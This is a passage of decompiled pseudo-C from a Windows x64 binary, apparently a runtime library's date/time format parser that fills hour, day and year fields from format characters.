**(ppuVar76 + 0x290) | 1;\n            }\n            goto code_r0x000140039f81;\n        case '(':\n            *(ppuVar76 + 0x30) = 0x3b;\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 0;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            UNRECOVERED_JUMPTABLE._0_8_ = ppuVar76 + 0xd8;\n            ppuVar35 = ppuVar76;\ncode_r0x00014003ad63:\n            ppuVar76 = ppuVar35;\n            *(ppuVar76 + 0x48) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003ada9;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 4) = *(ppuVar76 + 0xdc);\n            }\n            goto code_r0x000140039f81;\n        case '-':\n            unaff_RSI = ppuVar76 + 0xe0;\n            pcVar2 = (*unaff_R12)[0xb];\n            *(ppuVar76 + -8) = 0x14003ad00;\n            (*pcVar2)();\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            goto code_r0x00014003ab6b;\n        case '.':\n            *(ppuVar76 + 0x30) = 0x3c;\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 0;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            in_XMM3_Da = *(ppuVar76 + 0xc0);\n            in_XMM3_Db = *(ppuVar76 + 0xc4);\n            in_XMM3_Dc = *(ppuVar76 + 200);\n            in_XMM3_Dd = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppuVar76 + 0x270);\ncode_r0x00014003ac64:\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = in_XMM3_Da;\n            *(ppuVar76 + 0xa4) = in_XMM3_Db;\n            *(ppuVar76 + 0xa8) = in_XMM3_Dc;\n            *(ppuVar76 + 0xac) = in_XMM3_Dd;\n            *(ppuVar76 + -8) = 0x14003ac94;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                **(ppuVar76 + 0x280) = *(ppuVar76 + 0xdc);\n            }\n            goto code_r0x000140039f81;\n        case '/':\n            UNRECOVERED_JUMPTABLE._0_8_ = *unaff_R12;\n            unaff_RSI = ppuVar76 + 0xe0;\ncode_r0x00014003ab4f:\n            piVar88 = UNRECOVERED_JUMPTABLE._0_8_[0xb];\n            *(ppuVar76 + -8) = 0x14003ab52;\n            (*piVar88)();\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\ncode_r0x00014003ab6b:\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0x38) = unaff_RSI;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x290);\n            goto code_r0x00014003ab92;\n        case '0':\n            *(ppuVar76 + 0x30) = 0x35;\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 0;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            ppuVar34 = ppuVar76;\ncode_r0x00014003aa75:\n            ppuVar76 = ppuVar34;\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003aac3;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                uVar49 = **(ppuVar76 + 0x290);\n                *(ppuVar76 + 0x70) = uVar49;\n                **(ppuVar76 + 0x290) = (*(ppuVar76 + 0xdc) & 0x3f) << 0x10 | 0x20 | uVar49 & 0xffc0ffdf;\n            }\n            goto code_r0x000140039f81;\n        case '2':\n            *(ppuVar76 + 0x30) = 0x35;\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 0;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            in_XMM1_Da = *(ppuVar76 + 0xc0);\n            in_XMM1_Db = *(ppuVar76 + 0xc4);\n            in_XMM1_Dc = *(ppuVar76 + 200);\n            in_XMM1_Dd = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            pcVar53 = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x38) = 2;\ncode_r0x00014003a9a2:\n            *(ppuVar76 + 0x40) = pcVar53;\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = in_XMM1_Da;\n            *(ppuVar76 + 0xa4) = in_XMM1_Db;\n            *(ppuVar76 + 0xa8) = in_XMM1_Dc;\n            *(ppuVar76 + 0xac) = in_XMM1_Dd;\n            *(ppuVar76 + -8) = 0x14003a9c9;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                uVar49 = **(ppuVar76 + 0x290);\n                *(ppuVar76 + 0x70) = uVar49;\n                **(ppuVar76 + 0x290) = (*(ppuVar76 + 0xdc) & 0x3f) << 0x10 | 0x40 | uVar49 & 0xffc0ffbf;\n            }\n            goto code_r0x000140039f81;\n        case '3':\n            puVar63 = ppuVar76 + 0xb0;\n            iVar58 = *(*(*(ppuVar76 + 0x80) + 0x10) + 0x20);\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            break;\n        case '4':\n            *(ppuVar76 + 0x30) = 9999;\n            *(ppuVar76 + 0x28) = 0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 4;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003b78b;\n            fcn.140038900(ppuVar76 + 0xb0, *(ppuVar76 + 600), ppuVar76 + 0xa0, ppuVar76 + 0x90);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 0x14) = *(ppuVar76 + 0xdc) + -0x76c;\n                uVar40 = *(*(ppuVar76 + 0x290) + 1);\n                *(ppuVar76 + 0x70) = uVar40;\n                *(*(ppuVar76 + 0x290) + 1) = uVar40 & 0xf9 | 4;\n            }\n            goto code_r0x000140039f81;\n        case '5':\n            piVar88 = *(ppuVar76 + 0xc0);\n            if ((piVar88 != NULL) && (bVar89)) {\n                if (piVar88[2] < piVar88[3]) {\n                    iVar45 = *piVar88[2];\n                }\n                else {\n                    pcVar2 = *(*piVar88 + 0x48);\n                    *(ppuVar76 + -8) = 0x14003be17;\n                    iVar45 = (*pcVar2)();\n                }\n                if (iVar45 == -1) {\n                    *(ppuVar76 + 0xc0) = 0;\n                }\n            }\n            pcVar2 = (*unaff_R12)[2];\n            *(ppuVar76 + -8) = 0x14003b597;\n            cVar39 = (*pcVar2)();\n            if (cVar39 != '\\0') {\n                unaff_R13 = ppuVar76 + 0xd8;\n                unaff_R14 = ppuVar76 + 0xe0;\n                *(ppuVar76 + 0x30) = 0xe;\n                *(ppuVar76 + 0x40) = unaff_R13;\n                unaff_R15 = ppuVar76 + 0x90;\n                *(ppuVar76 + 0x20) = unaff_R14;\n                *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n                *(ppuVar76 + 0x88) = ppuVar76 + 0xb0;\n                *(ppuVar76 + 0x38) = *(ppuVar76 + 0x270);\n                *(ppuVar76 + 0x90) = unaff_RDI;\n                *(ppuVar76 + 0x28) = *0x14010ff10;\n                *(ppuVar76 + 0x70) = ppuVar76 + 0xa0;\n                *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n                *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n                *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n                *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n                *(ppuVar76 + -8) = 0x14003b636;\n                fcn.140038e30(ppuVar76 + 0xb0, *(ppuVar76 + 600), ppuVar76 + 0xa0, unaff_R15, *(ppuVar76 + 0x20), \n                              *(ppuVar76 + 0x28), *(ppuVar76 + 0x30), *(ppuVar76 + 0x38), *(ppuVar76 + 0x40), \n                              *(ppuVar76 + 0x48), *(ppuVar76 + 0x50), *(ppuVar76 + 0x58), *(ppuVar76 + 0x60), \n                              *(ppuVar76 + 0x68), *(ppuVar76 + 0x70), *(ppuVar76 + 0x78), *(ppuVar76 + 0x80));\n                uVar44 = *(ppuVar76 + 0xb8);\n                unaff_RSI = uVar44;\n                piVar88 = *(ppuVar76 + 0xb0);\n                *(ppuVar76 + 0xc0) = piVar88;\n                arg3 = uVar44 == 0xffff;\n                *(ppuVar76 + 200) = uVar44;\n                if ((piVar88 != NULL) && (uVar44 == 0xffff)) {\n                    if (piVar88[2] < piVar88[3]) {\n                        iVar45 = *piVar88[2];\n                    }\n                    else {\n                        pcVar2 = *(*piVar88 + 0x48);\n                        *(ppuVar76 + -8) = 0x14003bfe2;\n                        iVar45 = (*pcVar2)();\n                    }\n                    if (iVar45 == -1) {\n                        *(ppuVar76 + 0xc0) = 0;\n                    }\n                    arg3 = iVar45 == -1;\n                }\ncode_r0x00014003b66c:\n                cVar39 = arg3;\n                cVar73 = unaff_RBP;\n                if (cVar73 == '\\0') {\n                    cVar73 = arg1;\n                }\n                else {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar45 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar88 = *unaff_RDI;\n                        *(ppuVar76 + 100) = cVar39;\n                        pcVar2 = piVar88[9];\n                        *(ppuVar76 + -8) = 0x14003bfc3;\n                        iVar45 = (*pcVar2)(unaff_RDI);\n                        cVar39 = *(ppuVar76 + 100);\n                    }\n                    if (iVar45 == -1) {\n                        unaff_RDI = NULL;\n                    }\n                    else {\n                        cVar73 = '\\0';\n                    }\n                }\n                *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n                if ((cVar39 != cVar73) && (ppuVar37 = ppuVar76,  (*(ppuVar76 + 0xd8) | *(ppuVar76 + 0xe0)) == 0)) {\ncode_r0x00014003b698:\n                    ppuVar76 = ppuVar37;\n                    *(ppuVar76 + -8) = 0x14003b6a8;\n                    iVar45 = fcn.140029f90(ppuVar76 + 0xc0);\n                    pcVar2 = (*unaff_R12)[10];\n                    *(ppuVar76 + -8) = 0x14003b6b9;\n                    iVar46 = (*pcVar2)();\n                    if (iVar45 != iVar46) {\n                        *(ppuVar76 + -8) = 0x14003b6ca;\n                        iVar45 = fcn.140029f90(ppuVar76 + 0xc0);\n                        pcVar2 = (*unaff_R12)[10];\n                        *(ppuVar76 + -8) = 0x14003b6db;\n                        iVar46 = (*pcVar2)();\n                        if (iVar45 != iVar46) {\n                            unaff_RSI = *(ppuVar76 + 200);\n                            *(ppuVar76 + 100) = 0;\n                            goto code_r0x00014003af84;\n                        }\n                    }\n                    uVar56 = *(ppuVar76 + 0x88);\n                    *(ppuVar76 + 0x48) = unaff_R13;\n                    *(ppuVar76 + 0x28) = 0;\n                    uVar3 = *(ppuVar76 + 0x78);\n                    *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n                    *(ppuVar76 + 0x30) = 0x17;\n                    *(ppuVar76 + 0x20) = unaff_R14;\n                    *(ppuVar76 + 0x38) = 2;\n                    *(ppuVar76 + 0x98) = uVar3;\n                    *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n                    *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n                    *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n                    *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n                    *(ppuVar76 + 0x90) = unaff_RDI;\n                    *(ppuVar76 + -8) = 0x14003becd;\n                    fcn.140038900(uVar56, *(ppuVar76 + 600), *(ppuVar76 + 0x70), unaff_R15);\n                    *(ppuVar76 + 0x48) = unaff_R13;\n                    *(ppuVar76 + 0x28) = 0;\n                    *(ppuVar76 + 0x38) = 2;\n                    *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n                    *(ppuVar76 + 0x30) = 0x3b;\n                    *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n                    *(ppuVar76 + 0x20) = unaff_R14;\n                    *(ppuVar76 + 0xc0) = *(ppuVar76 + 0xb0);\n                    *(ppuVar76 + 0x98) = uVar3;\n                    *(ppuVar76 + 0x90) = unaff_RDI;\n                    *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n                    *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n                    *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n                    *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n                    *(ppuVar76 + -8) = 0x14003bf56;\n                    fcn.140038900(uVar56, *(ppuVar76 + 600), *(ppuVar76 + 0x70), unaff_R15);\n                    unaff_RSI = *(ppuVar76 + 0xb8);\n                    *(ppuVar76 + 0xc0) = *(ppuVar76 + 0xb0);\n                    *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n                    *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n                }\n                goto code_r0x00014003af84;\n            }\n            goto code_r0x000140039f66;\n        case '>':\n            puVar63 = ppuVar76 + 0xb0;\n            uVar56 = *(*(*(ppuVar76 + 0x80) + 0x10) + 0x30);\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0x38) = uVar56;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x290);\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\ncode_r0x00014003b1e8:\n            *(ppuVar76 + 0x30) = *(ppuVar76 + 0x280);\n            *(ppuVar76 + 0x28) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x20) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + -8) = 0x14003b22c;\n            fcn.140039d50(puVar63, *(ppuVar76 + 600), ppuVar76 + 0xa0, ppuVar76 + 0x90);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x290) + 1) = *(*(ppuVar76 + 0x290) + 1) | 4;\n            }\n            goto code_r0x000140039f81;\n        case '?':\n        case '@':\n            piVar88 = *(ppuVar76 + 0xc0);\n            if ((piVar88 != NULL) && (bVar89)) {\n                if (piVar88[2] < piVar88[3]) {\n                    iVar45 = *piVar88[2];\n                }\n                else {\n                    pcVar2 = *(*piVar88 + 0x48);\n                    *(ppuVar76 + -8) = 0x14003be40;\n                    iVar45 = (*pcVar2)();\n                }\n                if (iVar45 == -1) {\n                    *(ppuVar76 + 0xc0) = 0;\n                }\n            }\n            pcVar2 = (*unaff_R12)[2];\n            *(ppuVar76 + -8) = 0x14003a5bc;\n            cVar39 = (*pcVar2)();\n            if (cVar39 != '\\0') {\n                piVar88 = *(ppuVar76 + 0xc0);\n                if (piVar88[2] < piVar88[3]) {\n                    piVar88[2] = piVar88[2] + 2;\n                }\n                else {\n                    pcVar2 = *(*piVar88 + 0x50);\n                    *(ppuVar76 + -8) = 0x14003bda8;\n                    (*pcVar2)();\n                }\n                *(ppuVar76 + 200) = 0xffff;\n            }\n            *(ppuVar76 + 0x30) = 0x1f;\n            *(ppuVar76 + 0x28) = 1;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003a64f;\n            fcn.140038900(ppuVar76 + 0xb0, *(ppuVar76 + 600), ppuVar76 + 0xa0, ppuVar76 + 0x90);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 0xc) = *(ppuVar76 + 0xdc);\n                puVar52 = *(ppuVar76 + 0x290);\ncode_r0x00014003a69f:\n                *puVar52 = *puVar52 | 0x410;\n            }\n            goto code_r0x000140039f81;\n        case 'E':\n            *(ppuVar76 + 0x30) = 0x16e;\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 1;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            ppuVar33 = ppuVar76;\ncode_r0x00014003b0df:\n            ppuVar76 = ppuVar33;\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 3;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003b12d;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 0x1c) = *(ppuVar76 + 0xdc) + -1;\n                **(ppuVar76 + 0x290) = **(ppuVar76 + 0x290) | 4;\n            }\n            goto code_r0x000140039f81;\n        case 'H':\n            *(ppuVar76 + 0x30) = 0xc;\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 1;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            UNRECOVERED_JUMPTABLE._0_8_ = ppuVar76 + 0xd8;\n            in_XMM5_Da = *(ppuVar76 + 0xc0);\n            in_XMM5_Db = *(ppuVar76 + 0xc4);\n            in_XMM5_Dc = *(ppuVar76 + 200);\n            in_XMM5_Dd = *(ppuVar76 + 0xcc);\ncode_r0x00014003b3a4:\n            *(ppuVar76 + 0x48) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = in_XMM5_Da;\n            *(ppuVar76 + 0xa4) = in_XMM5_Db;\n            *(ppuVar76 + 0xa8) = in_XMM5_Dc;\n            *(ppuVar76 + 0xac) = in_XMM5_Dd;\n            *(ppuVar76 + -8) = 0x14003b3e1;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 0x10) = *(ppuVar76 + 0xdc) + -1;\n                **(ppuVar76 + 0x290) = **(ppuVar76 + 0x290) | 8;\n            }\n            goto code_r0x000140039f81;\n        case 'I':\n        case 'O':\n            ppiVar59 = *(ppuVar76 + 0xc0);\n            while( true ) {\n                uVar64 = unaff_RSI == -1;\n                uVar41 = ppiVar59 != NULL && uVar64;\n                uVar42 = uVar41;\n                if (uVar41) {\n                    if (ppiVar59[2] < ppiVar59[3]) {\n                        iVar45 = *ppiVar59[2];\n                    }\n                    else {\n                        piVar88 = *ppiVar59;\n                        *(ppuVar76 + 0x70) = uVar41;\n                        pcVar2 = piVar88[9];\n                        *(ppuVar76 + -8) = 0x14003bba2;\n                        iVar45 = (*pcVar2)(ppiVar59);\n                        uVar41 = *(ppuVar76 + 0x70);\n                    }\n                    uVar64 = 0;\n                    uVar42 = uVar41;\n                    if (iVar45 == -1) {\n                        ppiVar59 = NULL;\n                        uVar42 = 0;\n                        *(ppuVar76 + 0xc0) = 0;\n                        uVar64 = uVar41;\n                    }\n                }\n                uVar80 = unaff_RDI != NULL & uVar40;\n                uVar41 = uVar40;\n                if (uVar80 != 0) {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar45 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar88 = *unaff_RDI;\n                        *(ppuVar76 + 0x70) = uVar42;\n                        pcVar2 = piVar88[9];\n                        *(ppuVar76 + -8) = 0x14003bbb9;\n                        iVar45 = (*pcVar2)(unaff_RDI);\n                        uVar42 = *(ppuVar76 + 0x70);\n                    }\n                    if (iVar45 == -1) {\n                        unaff_RDI = NULL;\n                        uVar41 = uVar80;\n                    }\n                    else {\n                        uVar41 = 0;\n                    }\n                }\n                if (uVar64 == uVar41) break;\n                if (uVar42 != 0) {\n                    if (ppiVar59[2] < ppiVar59[3]) {\n                        iVar45 = *ppiVar59[2];\n                    }\n                    else {\n                        pcVar2 = (*ppiVar59)[9];\n                        *(ppuVar76 + -8) = 0x14003bbcd;\n                        iVar45 = (*pcVar2)(ppiVar59);\n                    }\n                    if (iVar45 == -1) {\n                        *(ppuVar76 + 0xc0) = 0;\n                        ppiVar59 = NULL;\n                    }\n                }\n                pcVar2 = (*unaff_R12)[2];\n                *(ppuVar76 + -8) = 0x14003a866;\n                cVar39 = (*pcVar2)();\n                if (cVar39 == '\\0') break;\n                if (ppiVar59[2] < ppiVar59[3]) {\n                    ppiVar59[2] = ppiVar59[2] + 2;\n                }\n                else {\n                    pcVar2 = (*ppiVar59)[10];\n                    *(ppuVar76 + -8) = 0x14003ba02;\n                    (*pcVar2)(ppiVar59);\n                }\n                unaff_RSI = 0xffffffff;\n                *(ppuVar76 + 200) = 0xffff;\n            }\n            goto code_r0x000140039f81;\n        case 'K':\n            piVar66 = *(*(*(ppuVar76 + 0x80) + 0x10) + 0x40);\n            piVar54 = *(*(*(ppuVar76 + 0x80) + 0x10) + 0x48);\n            *(ppuVar76 + 0xe0) = piVar66;\n            *(ppuVar76 + 0xe8) = piVar54;\n            if ((*piVar66 == 0) || (*piVar54 == 0)) {\ncode_r0x00014003af84:\n                ppiVar59 = *(ppuVar76 + 0xc0);\n            }\n            else {\n                *(ppuVar76 + 0x30) = 2;\n                *(ppuVar76 + 0x90) = unaff_RDI;\n                *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n                *(ppuVar76 + 0x40) = ppuVar76 + 0xd8;\n                *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n                *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n                *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n                *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n                *(ppuVar76 + 0x38) = *(ppuVar76 + 0x270);\n                *(ppuVar76 + 0x28) = ppuVar76 + 0xe0;\n                *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n                *(ppuVar76 + -8) = 0x14003bae2;\n                fcn.140038e30(ppuVar76 + 0xb0, *(ppuVar76 + 600), ppuVar76 + 0xa0, ppuVar76 + 0x90, *(ppuVar76 + 0x20), \n                              *(ppuVar76 + 0x28), *(ppuVar76 + 0x30), *(ppuVar76 + 0x38), *(ppuVar76 + 0x40), \n                              *(ppuVar76 + 0x48), *(ppuVar76 + 0x50), *(ppuVar76 + 0x58), *(ppuVar76 + 0x60), \n                              *(ppuVar76 + 0x68), *(ppuVar76 + 0x70), *(ppuVar76 + 0x78), *(ppuVar76 + 0x80));\n                ppiVar59 = *(ppuVar76 + 0xb0);\n                